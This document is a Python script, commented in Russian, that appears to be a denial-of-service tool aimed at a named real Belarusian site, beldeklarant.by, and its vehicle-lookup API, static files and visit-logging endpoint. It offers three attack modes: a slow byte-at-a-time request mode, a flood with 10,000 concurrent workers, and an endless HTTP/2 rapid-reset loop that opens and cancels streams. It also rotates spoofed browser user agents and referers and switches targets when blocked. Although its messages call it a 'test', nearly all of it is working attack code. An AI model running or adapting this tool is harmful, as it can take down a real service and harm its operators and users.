import asyncio
import json
import random
import secrets
import socket
import ssl
import string
import sys
import time
import urllib.parse
import uuid
from datetime import datetime, timezone

import aiohttp

try:
    import h2.connection as h2_connection  # type: ignore[import-not-found]
    import h2.config as h2_config  # type: ignore[import-not-found]
    from h2.errors import ErrorCodes  # type: ignore[import-not-found]
except ImportError:  # pragma: no cover - environment guard
    h2_connection = None
    h2_config = None
    ErrorCodes = None

# Список проверок: эндпоинты из примера скрипта
CHECKS = [
    [
        {"url": "https://beldeklarant.by/api/vehicles?vin=W1K2060431R001488", "method": "GET", "ssl": True, "kind": "vehicles_vin"},
        {"url": "https://beldeklarant.by/api/vehicles?vin=JTEBR3FJ20K191488", "method": "GET", "ssl": True, "kind": "vehicles_vin1"},
    ],[
        {"url": "https://beldeklarant.by/api/vehicles?vin=WMW41BR0303P12046", "method": "GET", "ssl": False, "kind": "WMW41BR0303P12046"},
        {"url": "https://beldeklarant.by/api/vehicles?vin=WBAWZ510600M36817", "method": "GET", "ssl": False, "kind": "WBAWZ510600M36817"},
        {"url": "https://beldeklarant.by/api/vehicles?vin=JTME6RFV5RJ895216", "method": "GET", "ssl": False, "kind": "JTME6RFV5RJ895216"},
        {"url": "https://beldeklarant.by/api/vehicles?vin=Z94C251BBJR012546", "method": "GET", "ssl": False, "kind": "Z94C251BBJR012546"},
        {"url": "https://beldeklarant.by/api/vehicles?vin=JMZKFGWMA00315072", "method": "GET", "ssl": False, "kind": "JMZKFGWMA00315072"},
        {"url": "https://beldeklarant.by/api/vehicles?vin=NMTK33BX10R240096", "method": "GET", "ssl": False, "kind": "NMTK33BX10R240096"},
        {"url": "https://beldeklarant.by/api/vehicles?vin=WVGZZZ5NZKM171297", "method": "GET", "ssl": False, "kind": "WVGZZZ5NZKM171297"},
        {"url": "https://beldeklarant.by/api/vehicles?vin=JHMRW2860KX212574", "method": "GET", "ssl": False, "kind": "JHMRW2860KX212574"},
        {"url": "https://beldeklarant.by/api/vehicles?vin=JTMW43FV90D082547", "method": "GET", "ssl": False, "kind": "JTMW43FV90D082547"},
        {"url": "https://beldeklarant.by/api/vehicles?vin=JMZKE5W7AP0452546", "method": "GET", "ssl": False, "kind": "JMZKE5W7AP0452546"},
        {"url": "https://beldeklarant.by/api/vehicles?vin=VF1JL000X64372147", "method": "GET", "ssl": False, "kind": "VF1JL000X64372147"},
        {"url": "https://beldeklarant.by/api/vehicles?vin=TMAJ3812GJJ436125", "method": "GET", "ssl": False, "kind": "TMAJ3812GJJ436125"},
        {"url": "https://beldeklarant.by/api/vehicles?vin=KNARH81GDM5010456", "method": "GET", "ssl": False, "kind": "KNARH81GDM5010456"},
        {"url": "https://beldeklarant.by/api/vehicles?vin=JM3KFBDM3P0201488", "method": "GET", "ssl": False, "kind": "JM3KFBDM3P0201488"},
        {"url": "https://beldeklarant.by/api/vehicles?vin=WDC1660241A561488", "method": "GET", "ssl": False, "kind": "WDC1660241A561488"},
        {"url": "https://beldeklarant.by/api/vehicles?vin=JMBXTGK1WJZ028426", "method": "GET", "ssl": False, "kind": "JMBXTGK1WJZ028426"},
        {"url": "https://beldeklarant.by/api/vehicles?vin=TMBJJ7NS2P8595463", "method": "GET", "ssl": False, "kind": "TMBJJ7NS2P8595463"},
        {"url": "https://beldeklarant.by/api/vehicles?vin=W1K2060431R001488", "method": "GET", "ssl": False, "kind": "W1K2060431R001488"},
    ],[
        {"url": "https://beldeklarant.by/container.svg", "method": "GET", "ssl": True, "kind": "container"},
        {"url": "https://beldeklarant.by/bptp.svg", "method": "GET", "ssl": True, "kind": "bptp"},
        {"url": "https://beldeklarant.by/bts.jpg", "method": "GET", "ssl": True, "kind": "bts"},
        {"url": "https://beldeklarant.by/arrow.webp", "method": "GET", "ssl": True, "kind": "arrow"},
        {"url": "https://beldeklarant.by/styles.css", "method": "GET", "ssl": True, "kind": "styles"},
        {"url": "https://beldeklarant.by/script.js", "method": "GET", "ssl": True, "kind": "script"},
        {"url": "https://beldeklarant.by/error.jpg", "method": "GET", "ssl": True, "kind": "errorjpg"},
        {"url": "https://beldeklarant.by/ztk.svg", "method": "GET", "ssl": True, "kind": "ztk"},
        {"url": "https://beldeklarant.by/rptto.svg", "method": "GET", "ssl": True, "kind": "rptto"},
    ],[
        {"url": "https://beldeklarant.by/log-visit.php", "method": "POST", "ssl": False, "kind": "log_visit1"},
    ],[
        {"url": "https://beldeklarant.by/api/vehicles", "method": "GET", "ssl": False, "kind": "vehicles_list"},
    ]
]

MODE = "rapid"  # slow | flood | rapid
TARGET = 2


if len(sys.argv) > 1:
    requested_mode = sys.argv[1].strip().lower()
    if requested_mode in {"slow", "flood", "rapid"}:
        MODE = requested_mode

if MODE == "slow":
    TOTAL_REQUESTS = 100000000
    DELAY_BETWEEN_REQ = 0.0
    MAX_CONCURRENT = 1000
    JITTER = 0.0
    BYTE_RATE_PER_SECOND = 1
elif MODE == "rapid":
    TOTAL_REQUESTS = 100000000
    DELAY_BETWEEN_REQ = 0.05
    MAX_CONCURRENT = 1
    JITTER = 0.0
    BYTE_RATE_PER_SECOND = None
else:
    TOTAL_REQUESTS = 100000000
    DELAY_BETWEEN_REQ = 0.0001
    MAX_CONCURRENT = 10000
    JITTER = 0.005
    BYTE_RATE_PER_SECOND = None

USER_AGENTS = [
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/24.0 Chrome/117.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Redmi Note 12 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (SMART-TV; Linux; Tizen 7.0) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/24.0 TV Safari/537.36",
    "Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 DMOST/1.0",
    "Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; ONEPLUS A6013) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
]


def build_payload(request_num: int, worker_id: int, check_cfg: dict) -> dict:
    iso_string = datetime.now(timezone.utc).isoformat(timespec="milliseconds").replace("+00:00", "Z")

    base_payload = {
        "requestId": f"req-{request_num}-w{worker_id}-{uuid.uuid4().hex}",
        "page": f"/probe/{uuid.uuid4().hex[:12]}",
        "timestamp": iso_string,
        "userAgent": random.choice(USER_AGENTS),
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "acceptLanguage": random.choice(["en-US,en;q=0.9", "ru-RU,ru;q=0.9,en;q=0.8", "de-DE,de;q=0.9,en;q=0.8"]),
        "acceptEncoding": "gzip, deflate, br",
        "referer": random.choice(["https://www.google.com/", "https://www.bing.com/", "https://www.yahoo.com/", "https://www.reddit.com/"]),
    }

    if check_cfg["kind"] == "log_visit":
        base_payload.update({
            "pageName": random.choice(["Главная", "ЗТК", "Контейнер", "ПТО"]),
            "event": "page_view",
            "screenWidth": random.randint(360, 1920),
            "screenHeight": random.randint(640, 1080),
        })
    elif check_cfg["kind"] == "vehicles_list":
        base_payload.update({
            "endpoint": "/api/vehicles",
            "limit": 10,
            "offset": random.randint(0, 100),
        })
    elif check_cfg["kind"] == "vehicles_vin":
        base_payload.update({
            "endpoint": "/api/vehicles",
            "vin": random.choice(["W1K2060431R001488", "JTEBR3FJ20K191488", "WVWZZZ1JZ3W123456"]),
        })

    return base_payload


request_counter = 0
success_count = 0
fail_count = 0
counter_lock = asyncio.Lock()


def get_check_cfg(request_num: int, target_index: int) -> dict:
    target_checks = CHECKS[target_index]
    return target_checks[(request_num - 1) % len(target_checks)]


def get_next_target_index() -> int:
    global TARGET
    current_target = TARGET
    TARGET = (TARGET + 1) % len(CHECKS)
    return current_target


def get_fallback_target_index() -> int:
    for idx, target_checks in enumerate(CHECKS):
        for check in target_checks:
            if isinstance(check, dict) and check.get("url"):
                return idx
    return 0


def rotate_target() -> int:
    global TARGET
    TARGET = (TARGET + 1) % len(CHECKS)
    return TARGET


async def run_rapid_http2_burst(check_cfg: dict, payload: dict) -> tuple[bool, str]:
    if h2_connection is None or h2_config is None or ErrorCodes is None:
        return False, "h2 package is required for rapid mode"

    parsed = urllib.parse.urlparse(check_cfg["url"])
    host = parsed.hostname or "localhost"
    if not host:
        return False, "empty host"
    try:
        socket.getaddrinfo(host, 443, proto=socket.IPPROTO_TCP)
    except socket.gaierror:
        fallback_idx = get_fallback_target_index()
        fallback_cfg = get_check_cfg(1, fallback_idx)
        if fallback_cfg.get("url"):
            check_cfg = fallback_cfg
            parsed = urllib.parse.urlparse(check_cfg["url"])
            host = parsed.hostname or "localhost"
            if not host:
                return False, "empty host"
        else:
            return False, "dns resolution failed"
    port = parsed.port or 443
    path = parsed.path or "/"
    if parsed.query:
        path = f"{path}?{parsed.query}"

    ssl_context = ssl.create_default_context()
    ssl_context.check_hostname = False
    ssl_context.verify_mode = ssl.CERT_NONE

    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(host, port, ssl=ssl_context, server_hostname=host),
            timeout=3.0,
        )
    except Exception as exc:
        return False, f"connect failed: {exc}"

    try:
        conn = h2_connection.H2Connection(config=h2_config.H2Configuration(client_side=True))
        conn.initiate_connection()
        writer.write(conn.data_to_send())
        await writer.drain()

        try:
            initial_data = await asyncio.wait_for(reader.read(65535), timeout=1.0)
        except asyncio.TimeoutError:
            initial_data = b""
        if initial_data:
            conn.receive_data(initial_data)

        headers = [
            (":method", check_cfg["method"].upper()),
            (":path", path),
            (":authority", host),
            (":scheme", "https"),
            ("user-agent", payload["userAgent"]),
            ("accept", payload["accept"]),
        ]

        inter = 0

        while True:
            stream_id = conn.get_next_available_stream_id()
            conn.send_headers(stream_id, headers, end_stream=False)
            conn.reset_stream(stream_id, error_code=ErrorCodes.CANCEL)

            writer.write(conn.data_to_send())
            inter += 1
            await writer.drain() 

    except Exception as exc:
        print(f"[-] ITER {inter} Rapid mode error: {exc}")
        return False, str(exc)
    finally:
        writer.close()
        await writer.wait_closed()


async def worker(session, worker_id):
    global request_counter, success_count, fail_count, TARGET

    while True:
        async with counter_lock:
            if request_counter >= TOTAL_REQUESTS:
                break
            request_counter += 1
            current_request_num = request_counter
            current_target = get_next_target_index()

        check_cfg = get_check_cfg(current_request_num, current_target)
        payload = build_payload(current_request_num, worker_id, check_cfg)

        try:
            start_time = time.time()
            body = json.dumps(payload, ensure_ascii=False)

            if MODE == "slow":

                # Запоминаем время начала отправки всей последовательности байт
                start_time = time.time()

                for idx, char in enumerate(body):
                    chunk = char.encode("utf-8")
                    
                    try:
                        async with session.request(
                            check_cfg["method"],
                            check_cfg["url"],
                            data=chunk,
                            timeout=5,
                            ssl=check_cfg["ssl"],
                        ) as response:
                            duration = time.time() - start_time
                            
                            if response.status in (200, 201):
                                print(
                                    f"[+] Запрос {current_request_num} (Воркер {worker_id}): Успешно"
                                    f" (Цель: {current_target}, Метод: {check_cfg['method']}, Статус: {response.status}, Время: {duration:.3f}с, байт {idx + 1})"
                                )
                                async with counter_lock:
                                    success_count += 1
                            elif response.status in (429, 403):
                                print(
                                    f"[!] Запрос {current_request_num} (Воркер {worker_id}):"
                                    f" Сервер вернул код {response.status} для {current_target}. Возможна блокировка."
                                )
                                async with counter_lock:
                                    fail_count += 1
                                break
                            else:
                                print(
                                    f"[-] Запрос {current_request_num} (Воркер {worker_id}):"
                                    f" Сервер вернул код {response.status} для {current_target}"
                                )
                                async with counter_lock:
                                    fail_count += 1
                                    
                    except Exception as e:
                        print(f"[-] Ошибка соединения для воркера {worker_id}: {e}")
                        async with counter_lock:
                            fail_count += 1
                            
                    await asyncio.sleep(1.0 / BYTE_RATE_PER_SECOND)

                for idx, char in enumerate(body):
                    chunk = char.encode("utf-8")
                    async with session.request(
                        check_cfg["method"],
                        check_cfg["url"],
                        data=chunk,
                        timeout=5,
                        ssl=check_cfg["ssl"],
                    ) as response:
                        duration = time.time() - start_time
                        if response.status in (200, 201):
                            print(
                                f"[+] Запрос {current_request_num} (Воркер {worker_id}): Успешно"
                                f" (Цель: {current_target}, Метод: {check_cfg['method']}, Статус: {response.status}, Время: {duration:.3f}с, байт {idx + 1})"
                            )
                            async with counter_lock:
                                success_count += 1
                        else:
                            print(
                                f"[-] Запрос {current_request_num} (Воркер {worker_id}):"
                                f" Сервер вернул код {response.status} для {current_target}"
                            )
                            async with counter_lock:
                                fail_count += 1
                    await asyncio.sleep(1.0 / BYTE_RATE_PER_SECOND)
            elif MODE == "rapid":
                try:
                    ok, detail = await run_rapid_http2_burst(check_cfg, payload)
                    duration = time.time() - start_time
                    if ok:
                        print(
                            f"[+] Запрос {current_request_num} (Воркер {worker_id}): HTTP/2 rapid burst OK"
                            f" (Цель: {current_target}, Метод: {check_cfg['method']}, Время: {duration:.3f}с, Детали: {detail})"
                        )
                        async with counter_lock:
                            success_count += 1
                    else:
                        print(
                            f"[-] Запрос {current_request_num} (Воркер {worker_id}): HTTP/2 rapid burst failed"
                            f" (Цель: {current_target}, Детали: {detail})"
                        )
                        async with counter_lock:
                            fail_count += 1
                except Exception as exc:
                    async with counter_lock:
                        fail_count += 1
                    print(
                        f"[-] Запрос {current_request_num} (Воркер {worker_id}): rapid mode error: {exc}"
                    )
            else:
                async with session.request(
                    check_cfg["method"],
                    check_cfg["url"],
                    json=payload,
                    timeout=5,
                    ssl=check_cfg["ssl"],
                ) as response:
                    duration = time.time() - start_time
                    if response.status in (200, 201):
                        print(
                            f"[+] Запрос {current_request_num} (Воркер {worker_id}): Успешно"
                            f" (Цель: {current_target}, Метод: {check_cfg['method']}, Статус: {response.status}, Время: {duration:.3f}с)"
                        )
                        async with counter_lock:
                            success_count += 1
                    else:
                        print(
                            f"[-] Запрос {current_request_num} (Воркер {worker_id}):"
                            f" Сервер вернул код {response.status} для {current_target}"
                        )
                        async with counter_lock:
                            fail_count += 1
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            async with counter_lock:
                fail_count += 1
                next_target = rotate_target()
            print(
                f"[!] Запрос {current_request_num} (Воркер {worker_id}): Ошибка соединения"
                f" ({e}) для {current_target}. Смена цели -> {next_target}"
            )

        sleep_for = DELAY_BETWEEN_REQ + random.uniform(0, JITTER)
        await asyncio.sleep(sleep_for)


async def main():
    print("[*] Запуск асинхронного теста")
    print(f"[*] Режим: {MODE}")
    print(f"[*] Целей для проверки: {len(CHECKS)}")
    print(f"[*] Всего запросов: {TOTAL_REQUESTS}, Одновременных воркеров: {MAX_CONCURRENT}\n")

    connector = aiohttp.TCPConnector(use_dns_cache=True, ttl_dns_cache=3)

    async with aiohttp.ClientSession(connector=connector) as session:
        workers = [
            asyncio.create_task(worker(session, worker_id))
            for worker_id in range(1, MAX_CONCURRENT + 1)
        ]
        await asyncio.gather(*workers)

    print("\n--- Итоги тестирования ---")
    print(f"Успешных запросов: {success_count}")
    print(f"Ошибок/сбоев: {fail_count}")


if __name__ == "__main__":
    import sys

    if sys.platform == "win32":
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

    asyncio.run(main())
